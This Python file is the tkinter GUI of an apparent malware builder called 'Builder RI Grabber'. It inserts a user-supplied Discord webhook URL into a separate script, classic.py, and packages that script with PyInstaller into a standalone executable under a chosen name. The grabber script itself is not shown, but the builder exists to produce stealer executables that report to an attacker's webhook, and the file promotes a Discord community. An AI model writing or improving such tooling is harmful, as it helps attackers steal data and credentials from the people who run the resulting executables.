import tkinter as tk
from tkinter import messagebox
import subprocess
import webbrowser

def save_webhook():
    webhook = webhook_entry.get()
    if webhook:
        try:
            with open('webhook.txt', 'w') as file:
                file.write(webhook)
            messagebox.showinfo("Success", "Webhook saved successfully !")
        except Exception as e:
            messagebox.showerror("File Error", f"An error occurred while saving the webhook: {e}")
    else:
        messagebox.showwarning("Input Error", "Please enter a webhook UR !")

def build_executable():
    webhook = webhook_entry.get()
    exe_name = exe_name_entry.get()
    if webhook and exe_name:
        try:
            with open('classic.py', 'r', encoding = 'utf-8') as file:
                code = file.read()
            
            code = code.replace('webhook_url = ""', f'webhook_url = "{webhook}"')
            
            with open('classic.py', 'w', encoding = 'utf-8') as file:
                file.write(code)
            
            result = subprocess.run(
                ['pyinstaller', '--onefile', '--clean', '--name', exe_name, 'classic.py'],
                capture_output = True, text = True, encoding = 'utf-8'
            )
            
            if result.returncode == 0:
                messagebox.showinfo("Success", "Executable built successfully, it is located in the dist folder!")
            else:
                raise Exception(result.stderr)
        except FileNotFoundError as e:
            messagebox.showerror("File Error", f"File not found: {e}")
        except Exception as e:
            messagebox.showerror("Error", f"An error occurred: {e}")
    else:
        messagebox.showwarning("Input Error", "Please enter both a webhook URL and an executable name !")

def open_discord():
    webbrowser.open_new("https://discord.gg/HF2CKG6Uas")

root = tk.Tk()
root.title("Builder RI Grabber !")
root.geometry("700x500") 
root.configure(bg = 'gray')

tk.Label(root, text = "Enter Webhook URL :", font = ("Arial", 14), bg = 'gray', fg = 'white').pack(pady = 20)
webhook_entry = tk.Entry(root, width = 50, font=("Arial", 12))
webhook_entry.pack(pady = 10)

tk.Label(root, text = "Enter Executable Name :", font = ("Arial", 14), bg = 'gray', fg = 'white').pack(pady = 20)
exe_name_entry = tk.Entry(root, width = 50, font = ("Arial", 12))
exe_name_entry.pack(pady = 10)

save_button = tk.Button(root, text = "Save Webhook", command = save_webhook, bg = "green", fg = "white", font = ("Arial", 12), width = 20, height = 2)
save_button.pack(pady = 10)

build_button = tk.Button(root, text = "Build Executable", command = build_executable, bg = "green", fg = "white", font = ("Arial", 12), width = 20, height = 2)
build_button.pack(pady = 10)

discord_button = tk.Button(root, text = "Join Discord 01 Community", command = open_discord, bg = "blue", fg = "white", font = ("Arial", 12), width = 20, height = 2)
discord_button.pack(pady = 20)

root.mainloop()